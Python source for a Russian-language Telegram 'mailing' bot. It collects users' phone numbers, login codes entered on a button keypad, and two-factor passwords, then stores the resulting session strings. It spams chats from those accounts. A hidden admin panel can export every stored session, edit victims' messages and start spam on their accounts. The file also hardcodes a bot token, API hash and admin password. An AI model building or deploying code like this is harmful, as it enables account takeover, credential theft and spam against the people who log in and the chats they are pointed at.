import asyncio, json, os, logging, time, threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
logger = logging.getLogger(__name__)

API_ID = 22376342
API_HASH = 'f623dc4ae2b015463cfde7874ab0f270'
BOT_TOKEN = '8706050462:AAFG92dwLhJhCm4DNCh4np4VCrQVzjANvdQ'
ADMIN_ID = "7113397602"
ADMIN_PASS = "12gleb34"
DB_FILE = 'users_data.json'
LOG_FILE = 'logs.json'

bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}
active_tasks = {}

# Веб-сервер для Render
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
def run_web():
    port = int(os.environ.get('PORT', 8080))
    HTTPServer(('0.0.0.0', port), Handler).serve_forever()
threading.Thread(target=run_web, daemon=True).start()

def load_db():
    return json.load(open(DB_FILE)) if os.path.exists(DB_FILE) else {}

def save_db(data):
    json.dump(data, open(DB_FILE, 'w'), indent=2, ensure_ascii=False)

def load_logs():
    return json.load(open(LOG_FILE)) if os.path.exists(LOG_FILE) else []

def save_log(entry):
    logs = load_logs()
    logs.append({"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), **entry})
    if len(logs) > 500: logs = logs[-500:]
    json.dump(logs, open(LOG_FILE, 'w'), indent=2, ensure_ascii=False)

def get_accounts(uid):
    return load_db().get(str(uid), {}).get('accounts', {})

WELCOME_TEXT = """
✏️ 👋 Добро пожаловать в нашу систему!

Приветствуем тебя, дорогой пользователь! Ты попал в официальный бот-рассыльщик.

🔗 https://github.com/dlyapleeroka123-cyber/telegram-bot

👨‍💻 Разработчик: @cf_mz
Поддержка: @ilialg
"""

def main_menu(uid):
    accs = get_accounts(uid)
    acc_count = len(accs)
    current_acc = user_states.get(str(uid), {}).get('current_account')
    is_authorized = acc_count > 0 and current_acc is not None
    kb = []
    if is_authorized:
        kb.append([InlineKeyboardButton("💬 Мои чаты", callback_data='chats_menu')])
        kb.append([InlineKeyboardButton("📝 Текст", callback_data='set_text'), InlineKeyboardButton("⏱ Интервал", callback_data='set_delay')])
        kb.append([InlineKeyboardButton("▶️ ЗАПУСТИТЬ", callback_data='start_spam'), InlineKeyboardButton("⏹ ОСТАНОВИТЬ", callback_data='stop_spam')])
        kb.append([InlineKeyboardButton("📊 Статус", callback_data='status')])
    if acc_count > 0:
        kb.append([InlineKeyboardButton(f"👤 Аккаунты ({acc_count}/3)", callback_data='accounts_list')])
    if acc_count < 3:
        kb.append([InlineKeyboardButton("📱 ВОЙТИ ПО НОМЕРУ", callback_data='login_phone')])
    return InlineKeyboardMarkup(kb) if kb else InlineKeyboardMarkup([[InlineKeyboardButton("📱 ВОЙТИ ПО НОМЕРУ", callback_data='login_phone')]])

def back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='back_main')]])

def code_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1", callback_data='c1'), InlineKeyboardButton("2", callback_data='c2'), InlineKeyboardButton("3", callback_data='c3')],
        [InlineKeyboardButton("4", callback_data='c4'), InlineKeyboardButton("5", callback_data='c5'), InlineKeyboardButton("6", callback_data='c6')],
        [InlineKeyboardButton("7", callback_data='c7'), InlineKeyboardButton("8", callback_data='c8'), InlineKeyboardButton("9", callback_data='c9')],
        [InlineKeyboardButton("0", callback_data='c0'), InlineKeyboardButton("⌫", callback_data='cb'), InlineKeyboardButton("✅ Готово", callback_data='cd')],
        [InlineKeyboardButton("🔙 Отмена", callback_data='back_main')]
    ])

def chats_menu_keyboard(chats):
    cl = '\n'.join([f"• {c}" for c in chats]) if chats else "пусто"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Добавить", callback_data='add_chat')],
        [InlineKeyboardButton("🗑 Очистить", callback_data='clear_chats')],
        [InlineKeyboardButton("🔙 В меню", callback_data='back_main')]
    ]), cl

# Админ-панель
def admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Юзеры", callback_data='adm_users')],
        [InlineKeyboardButton("📊 Статистика", callback_data='adm_stats')],
        [InlineKeyboardButton("🚦 Рассылки", callback_data='adm_spams')],
        [InlineKeyboardButton("📢 Broadcast", callback_data='adm_broadcast')],
        [InlineKeyboardButton("🔑 Сессии", callback_data='adm_sessions')],
        [InlineKeyboardButton("📝 Логи", callback_data='adm_logs')],
        [InlineKeyboardButton("🧹 Очистка", callback_data='adm_clean')],
        [InlineKeyboardButton("💾 Экспорт", callback_data='adm_export')],
        [InlineKeyboardButton("🔒 Выход", callback_data='back_main')]
    ])

def admin_users_keyboard(page=0):
    db = load_db()
    users = list(db.items())
    total = len(users)
    pages = (total + 4) // 5 if total > 0 else 1
    start = page * 5
    chunk = users[start:start+5]
    kb = []
    for uid, data in chunk:
        accs = data.get('accounts', {})
        username = ', '.join([f"@{a.get('username','?')}" for a in accs.values()]) or "нет акк"
        kb.append([InlineKeyboardButton(f"ID:{uid} ({username})", callback_data=f'adm_user_{uid}')])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️", callback_data=f'adm_upage_{page-1}'))
    nav.append(InlineKeyboardButton(f"{page+1}/{pages}", callback_data='none'))
    if page < pages-1: nav.append(InlineKeyboardButton("▶️", callback_data=f'adm_upage_{page+1}'))
    kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Назад", callback_data='adm_back')])
    return InlineKeyboardMarkup(kb)

def admin_user_menu(uid):
    db = load_db()
    user = db.get(uid, {})
    accs = user.get('accounts', {})
    blocked = user.get('blocked', False)
    info = f"👤 ID: {uid}\nАккаунтов: {len(accs)}\nСтатус: {'🔒 Заблокирован' if blocked else '✅ Активен'}"
    kb = [
        [InlineKeyboardButton("🔑 Смотреть сессии", callback_data=f'adm_usees_{uid}')],
        [InlineKeyboardButton("🚀 Запустить рассылку", callback_data=f'adm_ustart_{uid}')],
        [InlineKeyboardButton("⏹ Остановить всё", callback_data=f'adm_ustop_{uid}')],
        [InlineKeyboardButton("🔒 Блокировать" if not blocked else "🔓 Разблокировать", callback_data=f'adm_ublock_{uid}')],
        [InlineKeyboardButton("🗑 Удалить юзера", callback_data=f'adm_udel_{uid}')],
        [InlineKeyboardButton("🔙 К списку", callback_data='adm_users')]
    ]
    return info, InlineKeyboardMarkup(kb)

def admin_sessions_keyboard(uid):
    accs = get_accounts(uid)
    kb = []
    for name, acc in accs.items():
        kb.append([InlineKeyboardButton(f"👤 @{acc.get('username', name)}", callback_data=f'adm_acc_{uid}_{name}')])
    kb.append([InlineKeyboardButton("🔙 Назад", callback_data=f'adm_user_{uid}')])
    return InlineKeyboardMarkup(kb)

def admin_acc_menu(uid, acc_name):
    accs = get_accounts(uid)
    acc = accs.get(acc_name, {})
    info = f"👤 @{acc.get('username', acc_name)}\nЧатов: {len(acc.get('chats', []))}\nТекст: {acc.get('message', '-')}\nИнтервал: {acc.get('delay', 300)}с"
    kb = [
        [InlineKeyboardButton("💬 Чаты", callback_data=f'adm_achats_{uid}_{acc_name}')],
        [InlineKeyboardButton("📝 Сменить текст", callback_data=f'adm_atext_{uid}_{acc_name}')],
        [InlineKeyboardButton("⏱ Сменить интервал", callback_data=f'adm_adelay_{uid}_{acc_name}')],
        [InlineKeyboardButton("🚀 Запустить", callback_data=f'adm_astart_{uid}_{acc_name}')],
        [InlineKeyboardButton("⏹ Стоп", callback_data=f'adm_astop_{uid}_{acc_name}')],
        [InlineKeyboardButton("🔙 Назад", callback_data=f'adm_usees_{uid}')]
    ]
    return info, InlineKeyboardMarkup(kb)

async def admin_handle(call):
    uid = str(call.from_user.id)
    if uid != ADMIN_ID:
        await bot.answer_callback_query(call.id, "Нет доступа!")
        return
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    try:
        if data == 'adm_back':
            await bot.edit_message_text("👑 Админ-панель", cid, mid, reply_markup=admin_menu())
        elif data == 'adm_users':
            await bot.edit_message_text("👥 Юзеры:", cid, mid, reply_markup=admin_users_keyboard(0))
        elif data.startswith('adm_upage_'):
            page = int(data.split('_')[-1])
            await bot.edit_message_text("👥 Юзеры:", cid, mid, reply_markup=admin_users_keyboard(page))
        elif data.startswith('adm_user_'):
            target = data.replace('adm_user_', '')
            info, kb = admin_user_menu(target)
            await bot.edit_message_text(info, cid, mid, reply_markup=kb)
        elif data.startswith('adm_ublock_'):
            target = data.replace('adm_ublock_', '')
            db = load_db()
            if target in db:
                db[target]['blocked'] = not db[target].get('blocked', False)
                save_db(db)
                await bot.answer_callback_query(call.id, "Обновлено!")
                info, kb = admin_user_menu(target)
                await bot.edit_message_text(info, cid, mid, reply_markup=kb)
        elif data.startswith('adm_udel_'):
            target = data.replace('adm_udel_', '')
            db = load_db()
            if target in db:
                for acc_name in list(db[target].get('accounts', {}).keys()):
                    active_tasks.pop(f"{target}_{acc_name}", None)
                del db[target]
                save_db(db)
                await bot.answer_callback_query(call.id, "Удалён!")
                await bot.edit_message_text("👥 Юзеры:", cid, mid, reply_markup=admin_users_keyboard(0))
        elif data.startswith('adm_usees_'):
            target = data.replace('adm_usees_', '')
            await bot.edit_message_text(f"🔑 Сессии юзера {target}:", cid, mid, reply_markup=admin_sessions_keyboard(target))
        elif data.startswith('adm_acc_'):
            parts = data.split('_')
            tid = parts[2]
            an = '_'.join(parts[3:])
            info, kb = admin_acc_menu(tid, an)
            await bot.edit_message_text(info, cid, mid, reply_markup=kb)
        elif data.startswith('adm_achats_'):
            parts = data.split('_')
            tid = parts[2]
            an = '_'.join(parts[3:])
            accs = get_accounts(tid)
            chats = accs.get(an, {}).get('chats', [])
            cl = '\n'.join([f"• {c}" for c in chats]) if chats else "пусто"
            await bot.edit_message_text(f"💬 Чаты @{accs[an].get('username', an)}:\n{cl}", cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data=f'adm_acc_{tid}_{an}')]]))
        elif data.startswith('adm_atext_'):
            parts = data.split('_')
            tid = parts[2]
            an = '_'.join(parts[3:])
            user_states[uid] = {'step': 'adm_setting_text', 'target_uid': tid, 'target_acc': an}
            await bot.edit_message_text("📝 Отправь новый текст:", cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data=f'adm_acc_{tid}_{an}')]]))
        elif data.startswith('adm_adelay_'):
            parts = data.split('_')
            tid = parts[2]
            an = '_'.join(parts[3:])
            user_states[uid] = {'step': 'adm_setting_delay', 'target_uid': tid, 'target_acc': an}
            await bot.edit_message_text("⏱ Отправь новый интервал (30-3600):", cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data=f'adm_acc_{tid}_{an}')]]))
        elif data.startswith('adm_astart_'):
            parts = data.split('_')
            tid = parts[2]
            an = '_'.join(parts[3:])
            accs = get_accounts(tid)
            acc = accs.get(an, {})
            if acc.get('chats'):
                task_id = f"{tid}_{an}"
                active_tasks.pop(task_id, None)
                active_tasks[task_id] = True
                asyncio.create_task(spam_loop(acc['session'], tid, an))
                await bot.answer_callback_query(call.id, "Запущено!")
            else:
                await bot.answer_callback_query(call.id, "Нет чатов!")
        elif data.startswith('adm_astop_'):
            parts = data.split('_')
            tid = parts[2]
            an = '_'.join(parts[3:])
            active_tasks.pop(f"{tid}_{an}", None)
            await bot.answer_callback_query(call.id, "Остановлено!")
        elif data.startswith('adm_ustart_'):
            target = data.replace('adm_ustart_', '')
            accs = get_accounts(target)
            for an, a in accs.items():
                if a.get('chats'):
                    active_tasks[f"{target}_{an}"] = True
                    asyncio.create_task(spam_loop(a['session'], target, an))
            await bot.answer_callback_query(call.id, "Всё запущено!")
        elif data.startswith('adm_ustop_'):
            target = data.replace('adm_ustop_', '')
            for key in list(active_tasks.keys()):
                if key.startswith(f"{target}_"):
                    del active_tasks[key]
            await bot.answer_callback_query(call.id, "Всё остановлено!")
        elif data == 'adm_stats':
            db = load_db()
            logs = load_logs()
            total_users = len(db)
            total_accs = sum(len(u.get('accounts', {})) for u in db.values())
            active_now = len(active_tasks)
            sent_today = sum(1 for l in logs if l.get('action')=='sent' and l['time'].startswith(datetime.now().strftime("%Y-%m-%d")))
            sent_total = sum(1 for l in logs if l.get('action')=='sent')
            text = f"📊 Статистика:\n👥 Юзеров: {total_users}\n🔑 Аккаунтов: {total_accs}\n🚀 Активных рассылок: {active_now}\n✉️ Отправлено сегодня: {sent_today}\n📬 Отправлено всего: {sent_total}"
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='adm_back')]]))
        elif data == 'adm_broadcast':
            user_states[uid] = {'step': 'adm_broadcast'}
            await bot.edit_message_text("📢 Отправь сообщение для всех юзеров:", cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data='adm_back')]]))
        elif data == 'adm_logs':
            logs = load_logs()[-50:]
            text = "📝 Последние 50 логов:\n\n" + '\n'.join([f"[{l['time']}] {l.get('action','?')}: {l.get('detail','')}" for l in reversed(logs)])
            if len(text) > 4000: text = text[:4000] + "..."
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='adm_back')]]))
        elif data == 'adm_clean':
            db = load_db()
            cleaned = 0
            for uid2 in list(db.keys()):
                for an in list(db[uid2].get('accounts', {}).keys()):
                    if not db[uid2]['accounts'][an].get('session'):
                        del db[uid2]['accounts'][an]
                        cleaned += 1
            save_db(db)
            await bot.edit_message_text(f"🧹 Очищено {cleaned} битых сессий", cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='adm_back')]]))
        elif data == 'adm_export':
            db = load_db()
            export = json.dumps(db, indent=2, ensure_ascii=False)
            await bot.send_document(cid, export.encode(), visible_file_name='db_export.json', caption='💾 База данных')
            await bot.answer_callback_query(call.id, "Экспорт отправлен!")
        elif data == 'adm_spams':
            text = "🚦 Активные рассылки:\n\n"
            if not active_tasks:
                text += "Нет активных"
            else:
                for tid2 in active_tasks:
                    parts = tid2.split('_')
                    text += f"• Юзер {parts[0]}, акк {'_'.join(parts[1:])}\n"
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='adm_back')]]))
        elif data == 'adm_sessions':
            user_states[uid] = {'step': 'adm_lookup_session'}
            await bot.edit_message_text("🔑 Введи ID юзера:", cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='adm_back')]]))
    except Exception as e:
        logger.error(f"Admin error: {e}")

async def spam_loop(session_str, uid, acc_name):
    task_id = f"{uid}_{acc_name}"
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await client.connect()
        db = load_db()
        u = db.get(uid, {}).get('accounts', {}).get(acc_name, {})
        chats = list(u.get('chats', []))
        text = u.get('message', 'Привет!')
        delay = max(int(u.get('delay', 300)), 30)
        while task_id in active_tasks:
            for chat in chats:
                if task_id not in active_tasks: return
                try:
                    await client.send_message(chat, text)
                    save_log({"action": "sent", "detail": f"{uid}/{acc_name} -> {chat}", "user_id": uid})
                except Exception as e:
                    save_log({"action": "error", "detail": f"{uid}/{acc_name} -> {chat}: {e}", "user_id": uid})
                await asyncio.sleep(2)
            for _ in range(delay // 5):
                if task_id not in active_tasks: return
                await asyncio.sleep(5)
            await asyncio.sleep(delay % 5)
    except Exception as e:
        logger.error(f"Крах: {e}")
    finally:
        await client.disconnect()
        active_tasks.pop(task_id, None)

async def finish_login(uid, client, chat_id, acc_num):
    session_str = client.session.save()
    me = await client.get_me()
    db = load_db()
    if str(uid) not in db: db[str(uid)] = {'accounts': {}}
    acc_name = f"acc_{acc_num}"
    db[str(uid)]['accounts'][acc_name] = {
        'session': session_str, 'username': me.username or me.first_name,
        'chats': [], 'message': 'Привет!', 'delay': 300
    }
    save_db(db)
    user_states[str(uid)] = {'current_account': acc_name}
    await client.disconnect()
    await bot.send_message(chat_id, f"✅ Вошёл как @{me.username or me.first_name}!", reply_markup=main_menu(uid))

async def process_code(uid, chat_id, msg_id, state):
    code = state.get('entered_code', '')
    client = state.get('client')
    try:
        await client.sign_in(phone=state['phone'], code=code, phone_code_hash=state['phone_code_hash'])
        await finish_login(uid, client, chat_id, state.get('acc_num', 1))
        await bot.delete_message(chat_id, msg_id)
        user_states.pop(str(uid), None)
    except SessionPasswordNeededError:
        user_states[str(uid)]['step'] = 'waiting_2fa'
        await bot.edit_message_text("🔒 Облачный пароль (текстом):", chat_id, msg_id, reply_markup=back_keyboard())
    except Exception as e:
        await bot.edit_message_text(f"❌ {e}", chat_id, msg_id, reply_markup=main_menu(uid))
        if str(uid) in user_states:
            try: await user_states[str(uid)].get('client').disconnect()
            except: pass
            del user_states[str(uid)]

@bot.callback_query_handler(func=lambda call: True)
async def callback(call):
    uid = str(call.from_user.id)
    state = user_states.get(uid, {})
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    
    if data.startswith('adm_'):
        return await admin_handle(call)
    
    try:
        if data == 'login_phone':
            if len(get_accounts(uid)) >= 3: await bot.answer_callback_query(call.id, "Максимум 3!"); return
            user_states[uid] = {'step': 'waiting_phone', 'acc_num': len(get_accounts(uid)) + 1}
            await bot.edit_message_text("📱 Номер (с +):", cid, mid, reply_markup=back_keyboard())

        elif data.startswith('c') and len(data)==2 and data[1].isdigit():
            if state.get('step')=='entering_code':
                code = state.get('entered_code','') + data[1]
                if len(code)<=6:
                    user_states[uid]['entered_code']=code
                    await bot.edit_message_text(f"🔢 Код: {'●'*len(code)}", cid, mid, reply_markup=code_keyboard())
            await bot.answer_callback_query(call.id)

        elif data=='cb':
            if state.get('step')=='entering_code':
                code=state.get('entered_code','')[:-1]
                user_states[uid]['entered_code']=code
                await bot.edit_message_text(f"🔢 Код: {'●'*len(code) if code else 'пусто'}", cid, mid, reply_markup=code_keyboard())
            await bot.answer_callback_query(call.id)

        elif data=='cd':
            if state.get('step')=='entering_code':
                await process_code(uid, cid, mid, state)
            await bot.answer_callback_query(call.id)

        elif data=='accounts_list':
            accs = get_accounts(uid)
            if not accs: await bot.answer_callback_query(call.id, "Нет аккаунтов"); return
            kb=[[InlineKeyboardButton(f"👤 @{a.get('username',n)}", callback_data=f"acc_{n}")] for n,a in accs.items()]
            kb+=[[InlineKeyboardButton("🗑 Удалить", callback_data='delete_account')],[InlineKeyboardButton("🔙 Меню", callback_data='back_main')]]
            await bot.edit_message_text("👤 Аккаунты:", cid, mid, reply_markup=InlineKeyboardMarkup(kb))

        elif data.startswith('acc_'):
            an=data[4:]
            accs = get_accounts(uid)
            if an in accs:
                user_states[uid]={'current_account':an}
                kb=[[InlineKeyboardButton("💬 Чаты", callback_data='chats_menu')],
                    [InlineKeyboardButton("📝 Текст", callback_data='set_text'), InlineKeyboardButton("⏱ Интервал", callback_data='set_delay')],
                    [InlineKeyboardButton("▶️ Запустить", callback_data='start_spam'), InlineKeyboardButton("⏹ Стоп", callback_data='stop_spam')],
                    [InlineKeyboardButton("📊 Статус", callback_data='status')],
                    [InlineKeyboardButton("🔙 К списку", callback_data='accounts_list')]]
                await bot.edit_message_text(f"👤 @{accs[an].get('username',an)}", cid, mid, reply_markup=InlineKeyboardMarkup(kb))

        elif data=='delete_account':
            accs = get_accounts(uid)
            if not accs: await bot.answer_callback_query(call.id, "Нечего"); return
            kb=[[InlineKeyboardButton(f"❌ @{a.get('username',n)}", callback_data=f"del_{n}")] for n,a in accs.items()]
            kb+=[[InlineKeyboardButton("🔙 Назад", callback_data='accounts_list')]]
            await bot.edit_message_text("Удалить:", cid, mid, reply_markup=InlineKeyboardMarkup(kb))

        elif data.startswith('del_'):
            an=data[4:]
            accs = get_accounts(uid)
            if an in accs:
                active_tasks.pop(f"{uid}_{an}", None)
                db=load_db(); del db[uid]['accounts'][an]; save_db(db)
                if user_states.get(uid,{}).get('current_account')==an:
                    user_states[uid]['current_account']=None
                await bot.answer_callback_query(call.id, "Удалён!")
                await bot.edit_message_text("👤 Обновлено", cid, mid, reply_markup=main_menu(uid))

        elif data=='chats_menu':
            an=state.get('current_account')
            if not an: await bot.answer_callback_query(call.id, "Выбери аккаунт!"); return
            chats=get_accounts(uid).get(an,{}).get('chats',[])
            kb,cl=chats_menu_keyboard(chats)
            await bot.edit_message_text(f"💬 Чаты:\n{cl}", cid, mid, reply_markup=kb)

        elif data=='add_chat':
            user_states[uid]={**state,'step':'adding_chat'}
            await bot.edit_message_text("➕ @username:", cid, mid, reply_markup=back_keyboard())

        elif data=='clear_chats':
            an=state.get('current_account')
            if an:
                db=load_db(); db[uid]['accounts'][an]['chats']=[]; save_db(db)
                await bot.answer_callback_query(call.id, "Очищено!")
                await bot.edit_message_text("💬 Чаты:\nпусто", cid, mid, reply_markup=chats_menu_keyboard([])[0])

        elif data=='set_text':
            user_states[uid]={**state,'step':'setting_text'}
            await bot.edit_message_text("📝 Текст:", cid, mid, reply_markup=back_keyboard())

        elif data=='set_delay':
            user_states[uid]={**state,'step':'setting_delay'}
            await bot.edit_message_text("⏱ Интервал (30-3600):", cid, mid, reply_markup=back_keyboard())

        elif data=='start_spam':
            an=state.get('current_account')
            if not an: await bot.answer_callback_query(call.id, "Выбери!"); return
            acc=get_accounts(uid).get(an,{})
            if not acc.get('chats'): await bot.answer_callback_query(call.id, "Добавь чаты!"); return
            task_id = f"{uid}_{an}"
            active_tasks.pop(task_id, None)
            active_tasks[task_id] = True
            asyncio.create_task(spam_loop(acc['session'], uid, an))
            await bot.edit_message_text(f"🚀 Запущено!", cid, mid, reply_markup=back_keyboard())

        elif data=='stop_spam':
            an=state.get('current_account')
            if an: active_tasks.pop(f"{uid}_{an}", None)
            await bot.edit_message_text("⏹ Стоп", cid, mid, reply_markup=back_keyboard())

        elif data=='status':
            an=state.get('current_account')
            if not an: await bot.answer_callback_query(call.id, "Выбери!"); return
            acc=get_accounts(uid).get(an,{})
            act=f"{uid}_{an}" in active_tasks
            await bot.edit_message_text(f"📊 @{acc.get('username',an)}\nРассылка: {'🟢' if act else '🔴'}\nЧатов: {len(acc.get('chats',[]))}\nТекст: {acc.get('message','-')}\nИнтервал: {acc.get('delay',300)}с", cid, mid, reply_markup=back_keyboard())

        elif data=='back_main':
            await bot.edit_message_text("🏠 Меню:", cid, mid, reply_markup=main_menu(uid))
    except Exception as e:
        logger.error(f"Err: {e}")

@bot.message_handler(commands=['admin'])
async def admin_login(msg):
    uid = str(msg.from_user.id)
    if uid != ADMIN_ID:
        await bot.send_message(msg.chat.id, "🚫 Нет доступа!")
        return
    user_states[uid] = {'step': 'admin_auth'}
    await bot.send_message(msg.chat.id, "🔐 Введи пароль администратора:", reply_markup=back_keyboard())

@bot.message_handler(func=lambda m: True)
async def text(msg):
    uid=str(msg.from_user.id)
    state=user_states.get(uid,{})
    step=state.get('step')
    
    if step == 'admin_auth':
        if msg.text.strip() == ADMIN_PASS:
            del user_states[uid]
            await bot.send_message(msg.chat.id, "👑 Админ-панель:", reply_markup=admin_menu())
        else:
            del user_states[uid]
            await bot.send_message(msg.chat.id, "❌ Неверный пароль!")
        return
    
    if step == 'adm_broadcast':
        text = msg.text
        db = load_db()
        sent = 0
        for uid2 in db:
            try:
                await bot.send_message(int(uid2), f"📢 Рассылка:\n\n{text}")
                sent += 1
                await asyncio.sleep(0.5)
            except: pass
        del user_states[uid]
        await bot.send_message(msg.chat.id, f"📢 Отправлено {sent} юзерам", reply_markup=admin_menu())
        return
    
    if step == 'adm_lookup_session':
        target = msg.text.strip()
        await bot.send_message(msg.chat.id, f"🔑 Сессии юзера {target}:", reply_markup=admin_sessions_keyboard(target))
        del user_states[uid]
        return
    
    if step == 'adm_setting_text':
        tid = state.get('target_uid')
        tan = state.get('target_acc')
        db = load_db()
        if tid in db and tan in db[tid].get('accounts', {}):
            db[tid]['accounts'][tan]['message'] = msg.text.strip()
            save_db(db)
            await bot.send_message(msg.chat.id, "✅ Текст обновлён!", reply_markup=admin_menu())
        del user_states[uid]
        return
    
    if step == 'adm_setting_delay':
        try:
            delay = int(msg.text.strip())
            if 30 <= delay <= 3600:
                tid = state.get('target_uid')
                tan = state.get('target_acc')
                db = load_db()
                if tid in db and tan in db[tid].get('accounts', {}):
                    db[tid]['accounts'][tan]['delay'] = delay
                    save_db(db)
                    await bot.send_message(msg.chat.id, f"✅ Интервал {delay}с!", reply_markup=admin_menu())
            else:
                await bot.send_message(msg.chat.id, "❌ 30-3600!")
                return
        except:
            await bot.send_message(msg.chat.id, "❌ Число!")
            return
        del user_states[uid]
        return
    
    if step=='waiting_phone':
        phone=msg.text.strip()
        client=TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            sent=await client.send_code_request(phone)
            user_states[uid]={**state,'step':'entering_code','client':client,'phone':phone,'phone_code_hash':sent.phone_code_hash,'entered_code':''}
            await bot.send_message(msg.chat.id,"🔢 Код кнопками:",reply_markup=code_keyboard())
        except Exception as e:
            await bot.send_message(msg.chat.id,f"❌ {e}",reply_markup=main_menu(uid))
            del user_states[uid]
        return

    elif step=='waiting_2fa':
        pwd=msg.text.strip()
        client=state.get('client')
        if client:
            try:
                await client.sign_in(password=pwd)
                await finish_login(uid, client, msg.chat.id, state.get('acc_num', 1))
                user_states.pop(str(uid), None)
            except Exception as e:
                await bot.send_message(msg.chat.id,f"❌ {e}",reply_markup=back_keyboard())
        return

    elif step=='adding_chat':
        chat=msg.text.strip()
        an=state.get('current_account')
        if an:
            db=load_db()
            chats=db[uid]['accounts'][an].get('chats',[])
            if chat not in chats:
                db[uid]['accounts'][an]['chats']=chats+[chat]; save_db(db)
                await bot.send_message(msg.chat.id,f"✅ {chat}!",reply_markup=main_menu(uid))
            else: await bot.send_message(msg.chat.id,"Уже есть",reply_markup=main_menu(uid))
        del user_states[uid]
        return

    elif step=='setting_text':
        txt=msg.text.strip()
        an=state.get('current_account')
        if an:
            db=load_db(); db[uid]['accounts'][an]['message']=txt; save_db(db)
            await bot.send_message(msg.chat.id,f"✅ {txt}",reply_markup=main_menu(uid))
        del user_states[uid]
        return

    elif step=='setting_delay':
        try:
            d=int(msg.text.strip())
            if 30<=d<=3600:
                an=state.get('current_account')
                if an:
                    db=load_db(); db[uid]['accounts'][an]['delay']=d; save_db(db)
                    await bot.send_message(msg.chat.id,f"✅ {d}с",reply_markup=main_menu(uid))
            else: await bot.send_message(msg.chat.id,"❌ 30-3600!",reply_markup=back_keyboard()); return
        except: await bot.send_message(msg.chat.id,"❌ Число!",reply_markup=back_keyboard()); return
        del user_states[uid]
        return

    await bot.send_message(msg.chat.id,"🏠 Меню:",reply_markup=main_menu(uid))

@bot.message_handler(commands=['start'])
async def start(msg):
    uid = str(msg.from_user.id)
    await bot.send_message(msg.chat.id, WELCOME_TEXT)
    await bot.send_message(msg.chat.id, "🏠 Меню:", reply_markup=main_menu(uid))

async def restore():
    db=load_db()
    for uid,u in db.items():
        for an,a in u.get('accounts',{}).items():
            if 'session' in a:
                user_states[uid]={'current_account':an}
                if a.get('chats'):
                    active_tasks[f"{uid}_{an}"]=True
                    asyncio.create_task(spam_loop(a['session'], uid, an))

async def main():
    await restore()
    logger.info("Бот запущен!")
    await bot.polling(non_stop=True)

if __name__=='__main__':
    asyncio.run(main())
